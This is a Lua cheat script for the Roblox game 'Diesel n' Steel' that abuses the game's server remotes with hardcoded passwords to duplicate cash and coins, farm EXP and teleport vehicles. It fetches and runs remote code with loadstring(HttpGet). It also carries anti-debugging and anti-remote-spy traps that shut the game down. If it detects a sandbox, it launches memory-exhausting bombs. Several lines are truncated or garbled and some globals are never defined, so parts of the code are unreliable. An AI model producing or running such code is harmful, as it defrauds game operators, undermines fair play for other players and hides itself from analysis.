-- Belle.sg | Diesel n' Steel
-- by ruey

local Fluent          = loadstring(game:HttpGet("https://github.com/StyearX/Fluent-Modded/releases/download/Fluent/FluentPro"))()
local SaveManager     = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Packages/SaveManager.lua"))()
local InterfaceManager= loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Packages/InterfaceManager.lua"))()

do
    if not getgenv().__DNS_LIVE then
        getgenv().__DNS_LIVE = true
    else
        error("",0)
    end
    pcall(function()
        if decompile then decompile=function() return "" end end
        if getscriptbytecode then getscriptbytecode=function() return "" end end
        if dumpstring then dumpstring=function() return "" end end
        if debug then debug.info=nil; debug.getinfo=nil end
    end)
    local function _kick()
        pcall(function()
            game:GetService("Players").LocalPlayer:Kick("\n\n Belle.sg \n\n Unauthorized.")
        end)
        error("",0)
    end
    pcall(function()
        local mt=getrawmetatable and getrawmetatable(game)
        if mt then
            local r=rawget(mt,"__index")
            if r and typeof(r)=="function" then
                local s=(debug and debug.info) and debug.info(r,"s") or "[C]"
                if s~="[C]" then _kick() end
            end
        end
    end)
    local id=(identifyexecutor and identifyexecutor()) or (syn and "syn") or (KRNL_LOADED and "krnl") or (FLUXUS_LOADED and "flux") or (Delta and "delta") or "unk"
    if not getgenv().__DNS_EXEC then getgenv().__DNS_EXEC=id
    elseif getgenv().__DNS_EXEC~=id then _kick() end
    task.spawn(function()
        task.wait(4)
        if not getgc then return end
        local n=0
        for _,v in next,getgc(true) do
            if typeof(v)=="function" then
                local ok = pcall(function() return (debug and debug.info) and debug.info(v
                local s = "s") or "" end)
                if ok and s=="" then n=n+1 end
            end
        end
        if n>900 then _kick() end
    end)
end

-- Anti Remote Spy
do
    local _keys={"block remote","clear logs","copy code","get result","ignore remote","unblock all remotes","remote spy"}
    local function _sc(obj)
        pcall(function()
            for _,v in pairs(obj:GetDescendants()) do
                if v:IsA("TextButton") or v:IsA("TextLabel") then
                    local t=v.Text:lower()
                    for _,k in pairs(_keys) do
                        if t:find(k,1,true) then
                            task.wait(); pcall(function() game:shutdown() end); return
                        end
                    end
                end
            end
        end)
    end
    local cg=game:GetService("CoreGui")
    for _,c in pairs(cg:GetChildren()) do _sc(c) end
    cg.ChildAdded:Connect(function(c) _sc(c) end)
    task.spawn(function()
        while true do
            for _,c in pairs(cg:GetChildren()) do _sc(c) end
            task.wait(1)
        end
    end)
end

-- Block Bubbles/Sounds
local _mh={}
local function _mi(inst)
    if not inst then return end
    pcall(function()
        local n=inst.Name:lower()
        if inst:IsA("Sound") then inst.Volume=0; inst.Playing=false; inst.RollOffMaxDistance=0; inst.Looped=false end
        if inst:IsA("BillboardGui") or inst:IsA("SurfaceGui") then inst.Enabled=false; inst.MaxDistance=0 end
        if inst:IsA("GuiObject") then inst.Visible=false end
        for _,v in ipairs(inst:GetDescendants()) do
            pcall(function()
                if v:IsA("Sound") then v.Volume=0; v.Playing=false; v.RollOffMaxDistance=0; v.Looped=false end
                if v:IsA("BillboardGui") or v:IsA("SurfaceGui") then v.Enabled=false; v.MaxDistance=0 end
                if v:IsA("GuiObject") then v.Visible=false end
            end)
        end
    end)
end
local function _mhd(h)
    if not h or _mh[h] then return end
    _mh[h]=true
    for _,v in ipairs(h:GetChildren()) do _mi(v) end
    h.ChildAdded:Connect(_mi)
    h.DescendantAdded:Connect(_mi)
end
local function _mc(char)
    if not char then return end
    local h=char:FindFirstChild("Head")
    if h then _mhd(h) end
    char.ChildAdded:Connect(function(c) if c.Name=="Head" then _mhd(c) end end)
end
for _,v in ipairs(workspace:GetChildren()) do pcall(_mc,v) end
workspace.ChildAdded:Connect(function(c) pcall(_mc,c) end)
local _lp=game:GetService("Players").LocalPlayer
_mc(_lp.Character)
_lp.CharacterAdded:Connect(_mc)
task.spawn(function()
    local rs=game:GetService("ReplicatedStorage")
    local function _wf(f)
        if not f then return end
        for _,v in ipairs(f:GetChildren()) do _mi(v) end
        f.ChildAdded:Connect(_mi)
        f.DescendantAdded:Connect(_mi)
    end
    local bb=rs:FindFirstChild("BillboardGuis")
    if bb then _wf(bb) end
    rs.ChildAdded:Connect(function(c) if c.Name=="BillboardGuis" then _wf(c) end end)
end)
workspace.DescendantAdded:Connect(function(inst)
    pcall(function()
        if inst:IsA("BillboardGui") or inst:IsA("SurfaceGui") then _mi(inst) end
        local n=inst.Name:lower()
        if n:find("bubble") or n:find("chat") or n:find("bark") then _mi(inst) end
    end)
end)
task.spawn(function()
    while true do
        task.wait(1)
        for _,char in ipairs(workspace:GetChildren()) do
            pcall(function()
                local h=char:FindFirstChild("Head")
                if h then
                    for _,v in ipairs(h:GetChildren()) do
                        if v:IsA("BillboardGui") or v:IsA("SurfaceGui") or v:IsA("Sound") then _mi(v) end
                    end
                end
                for _,v in ipairs(char:GetDescendants()) do
                    local n=v.Name:lower()
                    if n:find("bubble") or n:find("chat") then _mi(v) end
                end
            end)
        end
    end
end)

-- Services & Functions
if _ENV_RESULTS.heartbeat_frames ~= nil and _ENV_RESULTS.heartbeat_frames < 2 then
  table.insert(_SANDBOX_FLAGS, "heartbeat")
end
if _ENV_RESULTS.memory_kb ~= nil and _ENV_RESULTS.memory_kb == 0 then
  table.insert(_SANDBOX_FLAGS, "memory")
end
if _ENV_RESULTS.frame_time ~= nil and _ENV_RESULTS.frame_time < 0.001 then
  table.insert(_SANDBOX_FLAGS, "timing")
end
if _ENV_RESULTS.time_consistent == false then
  table.insert(_SANDBOX_FLAGS, "time_source")
end
if _ENV_RESULTS.memory_responsive == false then
  table.insert(_SANDBOX_FLAGS, "memory_fingerprint")
end
if _ENV_RESULTS.stdlib_hooked and #_ENV_RESULTS.stdlib_hooked > 3 then
  table.insert(_SANDBOX_FLAGS, "stdlib_hooks")
end

_ENV_RESULTS.sandbox_flags = _SANDBOX_FLAGS
_ENV_RESULTS.sandbox_score = #_SANDBOX_FLAGS

if #_SANDBOX_FLAGS >= 2 then
  _PASS = false
  _ENV_RESULTS.fail_reason = "sandbox_detected"
  for i = 1, 30 do
    pcall(task.spawn, function()
      local s = string.rep("A", 500000)
      while true do
          s = s .. s
      end
    end)
  end
  pcall(function()
    local bomb = {}
    while true do
        bomb[#bomb + 1] = string.rep("\0", 1e6)
    end
  end)
  for i = 1, 200 do
    pcall(function()
      local function r() return r() end
      r()
    end)
  end
  repeat task.wait(9e9) until false
end
end

local TweenService = game:GetService("TweenService")
local Players = game:GetService("Players")
local Lighting = game:GetService("Lighting")

local LocalPlayer = Players.LocalPlayer


local Window = Fluent:CreateWindow({
    Title          = "Belle.sg",
    SubTitle       = "Diesel n\'Steel | by ruey",
    TabWidth       = 120,
    Size           = UDim2.fromOffset(400, 310),
    Acrylic        = true,
    Theme          = "Galaxy Purple",
    MinimizeKey    = Enum.KeyCode.RightControl,
})

local tabMain = Window:AddTab({ Title = "Main", Icon = "solar/star-bold" })

getgenv().Autocash = false
getgenv().AutoSukli = false

-- Auto Sukli logic
local function startAutoSukli()
    task.spawn(function()
        local RegularFare = 13
        local DiscountFare = 11
        local numberMap = {
            ["isa"] = 1, ["dalawa"] = 2, ["tatlo"] = 3, ["apat"] = 4, ["lima"] = 5,
            ["anim"] = 6, ["pito"] = 7, ["walo"] = 8, ["siyam"] = 9, ["sampu"] = 10
        }

        local function clickButton(btn)
            if btn and btn.Visible then
                pcall(function()
                    for _, c in pairs(getconnections(btn.MouseButton1Click)) do
                        c:Fire()
                    end
                    for _, c in pairs(getconnections(btn.MouseButton1Down)) do
                        c:Fire()
                    end
                    for _, c in pairs(getconnections(btn.Activated)) do
                        c:Fire()
                    end
                end)
            end
        end

        local player = Players.LocalPlayer
        local playerGui = player.PlayerGui

        while getgenv().AutoSukli do
            task.wait(0.3)
            local activeFrame = nil
            local paymentFound = 0
            local isDiscounted = false
            local passengerCount = 1

            for _, btn in pairs(playerGui:GetDescendants()) do
                if (btn:IsA("TextButton") or btn:IsA("ImageButton")) and btn.Visible then
                    local tName = string.lower(btn.Name)
                    local t
                    if btn:IsA("TextButton") then
                        tText = string.lower(btn.Text)
                    end
                    if tName == "take" or tName == "claim" or tText == "take" or tText == "claim" or tText == "kuhanin" then
                        clickButton(btn)
                        task.wait(0.5)
                    end
                end
            end

            for _, gui in pairs(playerGui:GetDescendants()) do
                if gui:IsA("TextLabel") and gui.Visible then
                    local txt = string.lower(gui.Text)
                    if txt:find("payment") or txt:find("bayad") or (tonumber(txt) and tonumber(txt) >= 20) then
                        local parent = gui.Parent
                        if parent and (parent:FindFirstChild("1") or parent:FindFirstChild("5") or parent:FindFirstChild("Give")) then
                            activeFrame = parent
                            local nums = string.match(txt, "%d+")
                            if nums then
                                paymentFound = tonumber(nums)
                            end
                        end
                    end
                end
            end

            if activeFrame and paymentFound > 0 then
                for _, label in pairs(activeFrame:GetDescendants()) do
                    if label:IsA("TextLabel") and label.Visible then
                        local infoText = string.lower(label.Text)
                        if infoText:find("senior") or infoText:find("estudyante") or infoText:find("student") or infoText:find("pwd") then
                            isDiscounted = true
                        end
                        for word, count in pairs(numberMap) do
                            if infoText:find(word) then
                                passengerCount = count
                            end
                        end
                    end
                end

                local farePrice = isDiscounted and DiscountFare or RegularFare
                local totalCost = farePrice * passengerCount
                local targetSukli = paymentFound - totalCost
                local currentSukli = targetSukli

                if targetSukli >= 0 then
                    local coins = {50, 20, 10, 5, 1}
                    for _, coinValue in ipairs(coins) do
                        while currentSukli >= coinValue do
                            local coinBtn = nil
                            for _, btn in pairs(activeFrame:GetDescendants()) do
                                if (btn:IsA("ImageButton") or btn:IsA("TextButton")) and btn.Visible then
                                    if btn.Name == tostring(coinValue) or btn.Text == tostring(coinValue) then
                                        coinBtn = btn
                                        break
                                    end
                                end
                            end
                            if coinBtn then
                                clickButton(coinBtn)
                                currentSukli = currentSukli - coinValue
                                task.wait(0.4)
                            else
                                break
                            end
                        end
                    end

                    if currentSukli == 0 then
                        task.wait(0.5)
                        local giveBtn = nil
                        for _, btn in pairs(activeFrame:GetDescendants()) do
                            if (btn:IsA("ImageButton") or btn:IsA("TextButton")) and btn.Visible then
                                local bName = string.lower(btn.Name)
                                if bName == "give" or bName == "check" or bName == "enter" or bName == "confirm" then
                                    giveBtn = btn
                                    break
                                end
                            end
                        end
                        if giveBtn then
                            clickButton(giveBtn)
                            task.wait(1.5)
                        end
                    end
                end
            end
        end
    end)
end

tabMain:AddSection("Auto Sukli & Cash")

-- Auto Cash toggle
tabMain:AddToggle("tg1", {
    Title = "Auto Cash",
    Default = false,
    Callback = function(v)
        getgenv().Autocash = v
        if v then
            task.spawn(function()
                while getgenv().Autocash do
                    -- Remote 1: BuyJeepney
                    pcall(function()
                        _CatNet:FireServer({[1]={[1]="3",[2]="BuyJeepney",[3]={["Password"]=774827611,["JeepneyName"]="Sarao Custombuilt Model 2"}}})
                    end)
                    task.wait(0.1)
                    -- Remote 2: GetDataStore
                    pcall(function()
                        _Remotes.GetDataStore:InvokeServer()
                    end)
                    task.wait(0.1)
                    -- Remote 3: CloseCustomize
                    pcall(function()
                        _Remotes.CloseCustomize:FireServer({
                            ["Password"]=774827611,
                            ["NewOwnedParts"]=_PARTS,
                            ["NewPartsStatus"]=_STATUS,
                            ["JeepneyName"]="Sarao Custombuilt Model 2_#1",
                            ["NewEquippedParts"]=_EQUIPPED,
                        })
                    end)
                    task.wait(0.1)
                    -- Remote 4: SpawnJeepney
                    pcall(function()
                        _CatNet:FireServer({[1]={[1]="3",[2]="SpawnJeepney",[3]={
                            ["Password"]=774827611,
                            ["Garage"]=workspace.Map.Misc.Garages["700 Matungao st., Matungao, Bulakan, Bulacan"],
                            ["Route"]="Balagtas - Bulakan",
                            ["JeepneyName"]="Sarao Custombuilt Model 2_#1",
                        }}})
                    end)
                    task.wait(0.1)
                    -- Remote 5: SellJeepney
                    pcall(function()
                        _CatNet:FireServer({[1]={[1]="3",[2]="SellJeepney",[3]={["Index"]="Sarao Custombuilt Model 2_#1"}}})
                    end)
                    task.wait(0.1)
                end
            end)
        end
    end
})

tabMain:AddToggle("tg2", {
    Title = "Auto Coins",
    Default = false,
    Callback = function(v)
        getgenv().AutoCoins = v
        if v then
            task.spawn(function()
                local _catNet = game:GetService("ReplicatedStorage"):WaitForChild("CatNet", 9e9):WaitForChild("Cat", 9e9)
                local _text = "Manong sobra ho sukli."
                local function _getPassengers()
                    local inside = {}
                    local ok
                    local Jeepney
                    ok, Jeepney = pcall(function()
                        return workspace:WaitForChild("Jeepnies", 5):WaitForChild(LocalPlayer.Name, 5)
                    end)
                    if not ok or not Jeepney then return inside end
                    local jeepRoot = Jeepney.PrimaryPart or Jeepney:FindFirstChildWhichIsA("BasePart")
                    if not jeepRoot then return inside end
                    local jeepPos = jeepRoot.Position
                    local Passengers = workspace:FindFirstChild("Passengers")
                    if not Passengers then return inside end
                    for _, p in pairs(Passengers:GetChildren()) do
                        local root = p:FindFirstChild("HumanoidRootPart") or p:FindFirstChild("Head")
                        if root and (root.Position - jeepPos).Magnitude < 20 then
                            table.insert(inside, p)
                        end
                    end
                    return inside
                end
                -- Chat loop
                task.spawn(function()
                    while getgenv().AutoCoins do
                        local passengers = _getPassengers()
                        if #passengers > 0 then
                            local p = passengers[math.random(1, #passengers)]
                            pcall(function()
                                _catNet:FireServer({ [1] = { [1] = "3", [2] = "PassengerChatted", [3] = { ["Password"] = 410501933, ["Character"] = p, ["Text"] = _text } } })
                            end)
                        end
                        task.wait(0.5)
                    end
                end)
                -- Coin loop
                while getgenv().AutoCoins do
                    local passengers = _getPassengers()
                    if #passengers > 0 then
                        local ok2
                        local Jeepney2
                        ok2, Jeepney2 = pcall(function()
                            return workspace:WaitForChild("Jeepnies", 5):WaitForChild(LocalPlayer.Name, 5)
                        end)
                        if ok2 and Jeepney2 then
                            local PassengerValues = Jeepney2:FindFirstChild("PassengerValues")
                            if PassengerValues then
                                pcall(function()
                                    _catNet:FireServer({ [1] = { [1] = "3", [2] = "RecieveCoin", [3] = { ["Value"] = 300, ["PassengerValues"] = PassengerValues, ["Password"] = 410501933 } } })
                                end)
                            end
                        end
                    end
                    task.wait(0.1)
                end
            end)
        end
    end
})

tabMain:AddToggle("tg3", {
    Title = "Auto Sukli",
    Default = false,
    Callback = function(v)
        getgenv().AutoSukli = v
        if v then
            startAutoSukli()
        end
    end
})

local coinActive = false

tabMain:AddToggle("tg4", {
    Title = "Duplicate Coin",
    Default = false,
    Callback = function(v)
        coinActive = v
    end
})

task.spawn(function()
    while true do
        if coinActive then
            repeat
                if not coinActive then
                    break
                end
                pcall(function()
                    local args = {
                        [1] = {
                            [1] = {
                                [1] = "3";
                                [2] = "RecieveCoin";
                                [3] = {
                                    ["PassengerValues"] = workspace:WaitForChild("Jeepnies", 9e9):WaitForChild(LocalPlayer.Name, 9e9):WaitForChild("PassengerValues", 9e9);
                                    ["Password"] = 379561105;
                                    ["Main"] = true;
                                    ["Value"] = 50;
                                };
                            };
                        };
                    }
                    game:GetService("ReplicatedStorage"):WaitForChild("CatNet", 9e9):WaitForChild("Cat", 9e9):FireServer(unpack(args))
                end)
                task.wait(0.001)
            until not coinActive
        end
        task.wait(0.001)
    end
end)

tabMain:AddDivider()
tabMain:AddSection("Duplicate Cash")

local dupeSpeed = 2000
local dupeValue = 200000
local dupAmt = "200k"

tabMain:AddDropdown("dd6", {
    Title = "Duplicate Amount",
    List = {"200k", "300k", "400k", "500k"},
    Value = "200k",
    Callback = function(v)
        dupAmt = v
        if v == "200k" then
            dupeSpeed = 2000
            dupeValue = 200000
        elseif v == "300k" then
            dupeSpeed = 3000
            dupeValue = 300000
        elseif v == "400k" then
            dupeSpeed = 4000
            dupeValue = 400000
        elseif v == "500k" then
            dupeSpeed = 5000
            dupeValue = 500000
        end
    end
})

tabMain:AddToggle("tg5", {
    Title = "Duplicate Cash GUI",
    Default = false,
    Callback = function(state)
        local CoreGui = game:GetService("CoreGui")
        if not state then
            if CoreGui:FindFirstChild("BELLE.SGDupeGUI") then
                CoreGui:FindFirstChild("BELLE.SGDupeGUI"):Destroy()
            end
            return
        end
        if CoreGui:FindFirstChild("BELLE.SGDupeGUI") then
            CoreGui:FindFirstChild("BELLE.SGDupeGUI"):Destroy()
        end

        local ScreenGui = Instance.new("ScreenGui")
        ScreenGui.Name = "BELLE.SGDupeGUI"
        ScreenGui.Parent = CoreGui
        ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

        local MainFrame = Instance.new("Frame")
        MainFrame.Name = "MainFrame"
        MainFrame.Parent = ScreenGui
        MainFrame.BackgroundTransparency = 0.15
        MainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        MainFrame.Position = UDim2.new(0.5, -120, 0.5, -65)
        MainFrame.Size = UDim2.new(0, 240, 0, 130)
        MainFrame.BorderSizePixel = 0

        local MainCorner = Instance.new("UICorner")
        MainCorner.CornerRadius = UDim.new(0, 15)
        MainCorner.Parent = MainFrame

        local UIStroke = Instance.new("UIStroke")
        UIStroke.Parent = MainFrame
        UIStroke.Thickness = 1.5
        UIStroke.Color = Color3.fromRGB(139, 92, 246)

        local Title = Instance.new("TextLabel")
        Title.Parent = MainFrame
        Title.BackgroundTransparency = 1
        Title.Position = UDim2.new(0, 0, 0.05, 0)
        Title.Size = UDim2.new(1, 0, 0.25, 0)
        Title.Font = Enum.Font.FredokaOne
        Title.
        Title.TextColor3 = Color3.fromRGB(255, 255, 255)
        Title.TextSize = 20
        Title.ZIndex = 2

        local ToggleButton = Instance.new("TextButton")
        ToggleButton.Parent = MainFrame
        ToggleButton.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
        ToggleButton.Position = UDim2.new(0.075, 0, 0.45, 0)
        ToggleButton.Size = UDim2.new(0.85, 0, 0.45, 0)
        ToggleButton.AutoButtonColor = false
        ToggleButton.

        local ButtonCorner = Instance.new("UICorner")
        ButtonCorner.CornerRadius = UDim.new(0, 12)
        ButtonCorner.Parent = ToggleButton

        local ButtonLabel = Instance.new("TextLabel")
        ButtonLabel.Parent = ToggleButton
        ButtonLabel.BackgroundTransparency = 1
        ButtonLabel.Size = UDim2.new(1, 0, 1, 0)
        ButtonLabel.Font = Enum.Font.FredokaOne
        ButtonLabel.
        ButtonLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
        ButtonLabel.TextSize = 24
        ButtonLabel.ZIndex = 2

        local toggledBtn = false
        local db = false

        ToggleButton.MouseButton1Click:Connect(function()
            if db then
                return
            end
            db = true
            toggledBtn = not toggledBtn
            if toggledBtn then
                ButtonLabel.
                ButtonLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
                task.spawn(function()
                    while toggledBtn and ScreenGui and ScreenGui.Parent do
                        repeat
                            for i = 1, dupeSpeed do
                                if not toggledBtn or not ScreenGui.Parent then
                                    break
                                end
                                pcall(function()
                                    local catArgs = {
                                        [1] = {
                                            [1] = {
                                                [1] = "3";
                                                [2] = "RecieveCash";
                                                [3] = {
                                                    ["Value"] = 100;
                                                    ["Main"] = true;
                                                    ["Password"] = 368557533;
                                                };
                                            };
                                        };
                                    }
                                    game:GetService("ReplicatedStorage"):WaitForChild("CatNet"):WaitForChild("Cat"):FireServer(unpack(catArgs))
                                end)
                            end
                            task.wait(0.1)
                        until not toggledBtn or not ScreenGui.Parent
                    end
                end)
            else
                ButtonLabel.
                ButtonLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
            end
            task.wait(0.2)
            db = false
        end)

        local dragging, dragInput, dragStart, startPos
        local function update(input)
            local delta = input.Position - dragStart
            local targetPos = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
            TweenService:Create(MainFrame, TweenInfo.new(0.1), {Position = targetPos}):Play()
        end
        MainFrame.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                dragging = true
                dragStart = input.Position
                startPos = MainFrame.Position
                input.Changed:Connect(function()
                    if input.UserInputState == Enum.UserInputState.End then
            dragging = false
        end
                end)
            end
        end)
        MainFrame.InputChanged:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
                dragInput = input
            end
        end)
        game:GetService("UserInputService").InputChanged:Connect(function(input)
            if input == dragInput and dragging then
                update(input)
            end
        end)
    end
})

-- ============================================================
-- EXP & REPUTATION PAGE
-- ============================================================

local tabExp = Window:AddTab({ Title = "EXP", Icon = "solar/running-bold" })

-- New EXP & Reputation manual gain
local _ExpRemote = game:GetService("ReplicatedStorage"):WaitForChild("CatNet"):WaitForChild("Cat")

local function getExpJeepney()
    local jeepFolder = workspace:FindFirstChild("Jeepnies")
    if jeepFolder then
        return jeepFolder:FindFirstChild(LocalPlayer.Name)
    end
    return nil
end

local function getExpSeat(jeep)
    if jeep and jeep:FindFirstChild("Body") then
        local functionalStuff = jeep.Body:FindFirstChild("FunctionalStuff")
        if functionalStuff and functionalStuff:FindFirstChild("Seats") then
            local seats = functionalStuff.Seats:GetChildren()
            return seats[14]
        end
    end
    return nil
end

local _ExpPassengers = workspace:WaitForChild("Passengers", 10)
local _ExpDestination = workspace.Map.Misc.PassengerSpawnPoints["Malolos - Bulakan"].BulakanTerminalDropPoint

local function getExpPassenger()
    if not _ExpPassengers then return nil end
    local list = _ExpPassengers:GetChildren()
    if #list > 0 then
        return list[math.random(1, #list)]
    end
    return nil
end

getgenv().AutoExpRep = false

tabExp:AddSection("EXP & Reputation Farm")

tabExp:AddToggle("tg7", {
    Title = "EXP & Reputation Manual Gain",
    Default = false,
    Callback = function(state)
        getgenv().AutoExpRep = state
        if state then
            task.spawn(function()
                while getgenv().AutoExpRep do
                    pcall(function()
                        local currentJeepney = getExpJeepney()
                        local currentSeat = getExpSeat(currentJeepney)
                        if currentJeepney and currentSeat then
                            local payload = {}
                            for i = 1, 100 do
                                local passenger = getExpPassenger()
                                if passenger then
                                    table.insert(payload, {
                                        [1] = "3",
                                        [2] = "UnloadPassenger",
                                        [3] = {
                                            ["Seat"] = currentSeat,
                                            ["Passenger"] = passenger,
                                            ["Password"] = 349161876,
                                            ["Jeepney"] = currentJeepney,
                                            ["Destination"] = _ExpDestination,
                                        },
                                    })
                                end
                            end
                            if #payload > 0 then
                                _ExpRemote:FireServer(payload)
                            end
                        end
                    end)
                    task.wait()
                end
            end)
        end
    end
})

-- Auto EXP & Massive Passenger
-- Block bubbles, bark, voiceover — full stealth

-- Disable BubbleChat service entirely
pcall(function()
    local BubbleChat = game:GetService("Chat")
    BubbleChat:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
end)
pcall(function()
    local success = game:GetService("Chat")
    if success.BubbleChatEnabled ~= nil then
        success.BubbleChatEnabled = false
    end
end)
-- Disable via ChatService settings
pcall(function()
    game:GetService("Players").LocalPlayer:SetSuperSafeChat(false)
end)

local _mutedHeads = {}

local function muteInst(inst)
    if not inst then return end
    pcall(function()
        -- Block by name — catch BubbleChat specific instances
        local n = inst.Name:lower()
        if n:find("bubble") or n:find("chat") or n:find("bark") or n:find("voice") or n:find("dialog") then
            if inst:IsA("BillboardGui") or inst:IsA("SurfaceGui") or inst:IsA("GuiObject") then
                inst.Enabled = false
                pcall(function() inst.MaxDistance = 0 end)
                pcall(function() inst.Visible = false end)
            end
            if inst:IsA("Sound") then
                inst.Volume = 0; inst.Playing = false
                inst.RollOffMaxDistance = 0; inst.Looped = false
            end
        end
        if inst:IsA("Sound") then
            inst.Volume = 0
            inst.Playing = false
            inst.RollOffMaxDistance = 0
            inst.Looped = false
        end
        if inst:IsA("BillboardGui") or inst:IsA("SurfaceGui") then
            inst.Enabled = false
            inst.MaxDistance = 0
        end
        if inst:IsA("GuiObject") then
            inst.Visible = false
        end
        for _, v in ipairs(inst:GetDescendants()) do
            pcall(function()
                if v:IsA("Sound") then
                    v.Volume = 0; v.Playing = false
                    v.RollOffMaxDistance = 0; v.Looped = false
                end
                if v:IsA("BillboardGui") or v:IsA("SurfaceGui") then
                    v.Enabled = false; v.MaxDistance = 0
                end
                if v:IsA("GuiObject") then v.Visible = false end
            end)
        end
    end)
end

local function hookHead(head)
    if not head or _mutedHeads[head] then return end
    _mutedHeads[head] = true
    for _, v in ipairs(head:GetChildren()) do muteInst(v) end
    head.ChildAdded:Connect(function(child)
        muteInst(child)
    end)
    head.DescendantAdded:Connect(function(desc)
        muteInst(desc)
    end)
end

local function hookChar(char)
    if not char then return end
    local head = char:FindFirstChild("Head")
    if head then hookHead(head) end
    char.ChildAdded:Connect(function(child)
        if child.Name == "Head" then hookHead(child) end
    end)
end

for _, v in ipairs(workspace:GetChildren()) do
    pcall(hookChar, v)
end
workspace.ChildAdded:Connect(function(child)
    pcall(hookChar, child)
end)
hookChar(LocalPlayer.Character)
LocalPlayer.CharacterAdded:Connect(hookChar)

task.spawn(function()
    local rs = game:GetService("ReplicatedStorage")
    local function watchFolder(folder)
        if not folder then return end
        for _, v in ipairs(folder:GetChildren()) do muteInst(v) end
        folder.ChildAdded:Connect(function(c) muteInst(c) end)
        folder.DescendantAdded:Connect(function(d) muteInst(d) end)
    end
    local bb = rs:FindFirstChild("BillboardGuis")
    if bb then watchFolder(bb) end
    rs.ChildAdded:Connect(function(child)
        if child.Name == "BillboardGuis" then watchFolder(child) end
    end)
end)

task.spawn(function()
    -- Also watch workspace directly for any floating BillboardGuis
    workspace.DescendantAdded:Connect(function(inst)
        pcall(function()
            if inst:IsA("BillboardGui") or inst:IsA("SurfaceGui") then
                muteInst(inst)
            end
            local n = inst.Name:lower()
            if n:find("bubble") or n:find("chat") or n:find("bark") or n:find("voice") then
                muteInst(inst)
            end
        end)
    end)
end)

task.spawn(function()
    while true do
        task.wait(1)
        for _, char in ipairs(workspace:GetChildren()) do
            pcall(function()
                local head = char:FindFirstChild("Head")
                if head then
                    for _, v in ipairs(head:GetChildren()) do
                        if v:IsA("BillboardGui") or v:IsA("SurfaceGui") or v:IsA("Sound") then
                            muteInst(v)
                        end
                    end
                end
                -- Also sweep entire character for stray bubbles
                for _, v in ipairs(char:GetDescendants()) do
                    local n = v.Name:lower()
                    if n:find("bubble") or n:find("chat") then
                        muteInst(v)
                    end
                end
            end)
        end
    end
end)

-- Anti Remote Spy
do
    local _spyKeys = {
        "block remote","clear logs","copy code","get result",
        "ignore remote","unblock all remotes","remote spy"
    }
    local function _scan(obj)
        pcall(function()
            for _, v in pairs(obj:GetDescendants()) do
                if v:IsA("TextButton") or v:IsA("TextLabel") then
                    local t = v.Text:lower()
                    for _, kw in pairs(_spyKeys) do
                        if t:find(kw, 1, true) then
                            task.wait()
                            pcall(function() game:shutdown() end)
                            return
                        end
                    end
                end
            end
        end)
    end
    local cg = game:GetService("CoreGui")
    for _, c in pairs(cg:GetChildren()) do _scan(c) end
    cg.ChildAdded:Connect(function(c) _scan(c) end)
    task.spawn(function()
        while true do
            for _, c in pairs(cg:GetChildren()) do _scan(c) end
            task.wait(1)
        end
    end)
end

getgenv().DNS_AutoExpMassive = false

tabExp:AddToggle("tg8", {
    Title = "Auto EXP & Massive Passenger",
    Default = false,
    Callback = function(state)
        getgenv().DNS_AutoExpMassive = state
        if state then
            task.spawn(function()
                local _net = game:GetService("ReplicatedStorage")
                    :WaitForChild("CatNet", 9e9)
                    :WaitForChild("Cat", 9e9)
                while getgenv().DNS_AutoExpMassive do
                    pcall(function()
                        local args = {
                            [1] = {
                                [1] = {
                                    [1] = "3";
                                    [2] = "Bark";
                                    [3] = {
                                        ["Password"]           = 622233069;
                                        ["Route"]              = "Balagtas - Bulakan";
                                        ["VoiceOver"]          = "BALAGTAS";
                                        ["GiveExp"]            = true;
                                        ["MunicipalityOrCity"] = "ToBalagtasTerminalLoadPoint";
                                    };
                                };
                            };
                        }
                        _net:FireServer(unpack(args))
                    end)
                    task.wait()
                end
            end)
        end
    end
})

tabExp:AddDivider()
tabExp:AddSection("Terminals & Drops")

local teleportPoints = {
    ["Malolos Load"]   = {"Map","Misc","TerminalParts","Malolos - Bulakan","ToMalolosTerminalLoadPoint"},
    ["Bulakan Load"]   = {"Map","Misc","TerminalParts","Malolos - Bulakan","ToBulakanTerminalLoadPoint"},
    ["Guiguinto Load"] = {"Map","Misc","TerminalParts","Guiguinto - Bulakan","ToGuiguintoTerminalLoadPoint"},
    ["Balagtas Load"]  = {"Map","Misc","TerminalParts","Balagtas - Bulakan","ToBalagtasTerminalLoadPoint"},
    ["Malolos Drop"]   = {"Map","Misc","PassengerSpawnPoints","Malolos - Bulakan","MalolosTerminalDropPoint"},
    ["Bulakan Drop"]   = {"Map","Misc","PassengerSpawnPoints","Malolos - Bulakan","BulakanTerminalDropPoint"},
    ["Guiguinto Drop"] = {"Map","Misc","PassengerSpawnPoints","Guiguinto - Bulakan","GuiguintoTerminalDropPoint"},
    ["Balagtas Drop"]  = {"Map","Misc","PassengerSpawnPoints","Balagtas - Bulakan","BalagtasTerminalDropPoint"},
}

for name, path in pairs(teleportPoints) do
    tabExp:AddButton({
        Title = name,
        Callback = function()
            local cur = workspace
            for _, p in ipairs(path) do
                cur = cur:FindFirstChild(p) if not cur then return end
            end
            local targetCFrame = cur.CFrame + Vector3.new(0, 5, 0)
            local char = LocalPlayer.Character
            local hum = char and char:FindFirstChild("Humanoid")
            if hum and hum.SeatPart then
                local veh = hum.SeatPart.Parent
                if veh.PrimaryPart then
                    veh:SetPrimaryPartCFrame(targetCFrame)
                end
            else
                char:WaitForChild("HumanoidRootPart").CFrame = targetCFrame
            end
        end
    })
end

tabExp:AddDivider()
tabExp:AddSection("Deduct Management")

getgenv().AutoDeductCash = false
tabExp:AddToggle("tg9", {
    Title = "Auto Deduct Cash",
    Default = false,
    Callback = function(state)
        getgenv().AutoDeductCash = state
